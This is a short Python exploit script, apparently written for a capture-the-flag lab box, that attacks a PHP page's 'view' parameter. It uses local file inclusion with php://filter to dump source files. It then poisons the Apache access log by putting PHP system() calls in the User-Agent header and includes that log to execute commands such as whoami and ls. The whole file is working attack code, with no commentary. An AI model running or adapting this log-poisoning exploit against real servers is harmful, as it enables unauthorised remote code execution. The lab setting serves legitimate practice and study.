#!/usr/bin/env python3
import requests

target = "http://10.10.197.237/"

#"?view=./dog/../index"

def req(url, param='', useragent=''):
	url = target+param
	if useragent != '':
		headers = { 'User-Agent':useragent }
	else:
		headers = {}
	print("[DEBUG] URL=%s" % url)
	r = requests.get(url, headers=headers)
	return r.text

# Request main page
print("-- request main page ---")
print(req(target))

# Request main page
print("-- index.php source file---")
print(req(target, param="?view=php://filter/read=convert.base64-encode/resource=./dog/../index"))

# Request dog page
print("-- dog.php source file---")
print(req(target, param="?view=php://filter/read=convert.base64-encode/resource=./dog"))

# Request cat page
print("-- cat.php source file---")
print(req(target, param="?view=php://filter/read=convert.base64-encode/resource=./cat"))

# whoami
print("-- whoami---")
req(target, useragent="<?php system('whoami');?>")
print(req(target, param="?view=./dog/../../../../var/log/apache2/access.log&ext"))

# ls /var/www/html
print("-- ls /var/www/html ---")
req(target, useragent="<?php system('ls');?>")
print(req(target, param="?view=./dog/../../../../var/log/apache2/access.log&ext"))
